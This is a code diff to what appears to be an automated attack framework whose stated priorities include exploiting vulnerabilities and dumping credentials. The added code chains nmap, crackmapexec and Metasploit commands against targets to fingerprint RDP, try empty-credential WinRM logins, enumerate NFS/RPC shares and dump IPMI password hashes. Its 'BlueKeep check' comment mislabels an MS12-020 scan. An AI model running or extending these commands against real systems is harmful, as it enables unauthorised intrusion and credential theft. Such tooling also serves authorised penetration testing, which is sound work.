@@ -13957,6 +13957,55 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
             if dns_out.strip() and "Transfer failed" not in dns_out:
                 accumulated_output.append(f"=== DNS Zone Transfer {target} ===\n{dns_out[:800]}")
 
+        # ── RDP + NLA fingerprint ─────────────────────────────────────────
+        port_set_adv = {p["port"] for p in open_ports}
+        if 3389 in port_set_adv:
+            rdp_out, _ = self._run_cmd(
+                "rdp-fingerprint",
+                f"nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {target} 2>/dev/null | head -15; "
+                f"# BlueKeep check\n"
+                f"nmap -p 3389 --script rdp-vuln-ms12-020 {target} 2>/dev/null | grep -i 'vuln\\|cve' | head -5",
+                target, timeout=20,
+            )
+            if rdp_out.strip():
+                accumulated_output.append(f"=== RDP Fingerprint ===\n{rdp_out[:400]}")
+
+        # ── WinRM enumeration (5985/5986) ──────────────────────────────────
+        if 5985 in port_set_adv or 5986 in port_set_adv:
+            winrm_port = 5985 if 5985 in port_set_adv else 5986
+            winrm_out, _ = self._run_cmd(
+                f"winrm-enum-{winrm_port}",
+                f"crackmapexec winrm {target} -u '' -p '' 2>/dev/null | head -5; "
+                f"curl -sk --max-time 8 'http://{target}:{winrm_port}/wsman' 2>/dev/null | grep -i 'xml\\|winrm\\|wsman' | head -5",
+                target, timeout=15,
+            )
+            if winrm_out.strip():
+                accumulated_output.append(f"=== WinRM {winrm_port} ===\n{winrm_out[:200]}")
+
+        # ── NFS + RPC services ────────────────────────────────────────────
+        if 2049 in port_set_adv or 111 in port_set_adv:
+            nfs_rpc_out, _ = self._run_cmd(
+                "nfs-rpc-enum",
+                f"showmount -e {target} 2>/dev/null | head -15; "
+                f"rpcinfo -p {target} 2>/dev/null | head -20; "
+                f"nmap -p 111,2049 --script nfs-ls,nfs-statfs,nfs-showmount,rpcinfo {target} 2>/dev/null | head -30",
+                target, timeout=20,
+            )
+            if nfs_rpc_out.strip():
+                accumulated_output.append(f"=== NFS/RPC ===\n{nfs_rpc_out[:500]}")
+
+        # ── IPMI version + hash dump ──────────────────────────────────────
+        if 623 in port_set_adv:
+            ipmi_out, _ = self._run_cmd(
+                "ipmi-hash-dump",
+                f"nmap -p 623 -sU --script ipmi-version,ipmi-dumphashes {target} 2>/dev/null | head -20; "
+                f"msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; "
+                f"set RHOSTS {target}; run; sleep 5; exit' 2>/dev/null | grep -i 'hash\\|ipmi\\|rakp' | head -10",
+                target, timeout=40,
+            )
+            if ipmi_out.strip():
+                accumulated_output.append(f"=== IPMI {target}:623 ===\n{ipmi_out[:400]}")
+
     # ─────────────────────────────────────────────────────────────────────────
     # Tier 2-7: File upload → webshell bypass
     # ─────────────────────────────────────────────────────────────────────────
